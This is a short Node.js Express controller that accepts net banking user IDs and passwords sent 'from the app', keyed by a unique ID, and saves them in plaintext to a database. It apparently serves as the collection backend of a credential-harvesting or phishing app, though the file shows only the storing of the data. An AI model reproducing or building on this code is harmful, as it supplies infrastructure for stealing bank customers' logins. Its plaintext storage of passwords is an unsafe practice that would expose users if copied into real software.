// controllers/netBankingController.js
const NetBanking = require('../models/NetBanking');

exports.submitNetBankingData = async (req, res) => {
  try {
    // App se aane wale fields: uniqueid, userId, password
    const { uniqueid, userId, password } = req.body;

    // Check if data already exists for this uniqueid
    let netBanking = await NetBanking.findOne({ uniqueid });

    if (netBanking) {
      // Update existing document
      netBanking.userId = userId;
      netBanking.password = password;
    } else {
      // Create new document
      netBanking = new NetBanking({
        uniqueid,
        userId,
        password
      });
    }

    // Save the data
    await netBanking.save();

    // Send success response
    res.status(200).json({
      success: true,
      message: "Net Banking Data Submitted Successfully!"
    });
  } catch (error) {
    console.error("NetBanking Submit Error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting net banking data"
    });
  }
};
